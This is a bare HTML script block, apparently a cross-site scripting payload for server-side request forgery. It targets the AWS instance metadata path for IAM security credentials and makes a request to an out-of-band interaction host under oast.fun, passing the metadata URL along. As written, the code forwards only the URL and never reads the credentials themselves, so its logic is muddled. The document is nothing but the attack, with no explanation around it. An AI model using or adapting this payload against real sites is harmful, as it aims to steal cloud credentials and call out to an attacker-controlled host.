<script>
  // Create a new XMLHttpRequest object
  var xhr = new XMLHttpRequest();
  
  // Define the URL to fetch data from
  var url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  
  // Define the Burp Collaborator server URL
  var burpCollaboratorUrl = 'http://aqtpxmkemtoqajzsfzii3iownxmaahgl4.oast.fun';
  
  // Configure the request
  xhr.open('GET', burpCollaboratorUrl + '/?url=' + encodeURIComponent(url), true);
  
  // Set up a callback function to handle the response
  xhr.onload = function() {
    // Check if the request was successful
    if (xhr.status >= 200 && xhr.status < 300) {
      // Extract the response data
      var responseData = xhr.responseText;
      
      // Output the response data
      alert(responseData);
    } else {
      // Handle errors
      console.error('Request failed with status:', xhr.status);
    }
  };
  
  // Send the request
  xhr.send();
</script>
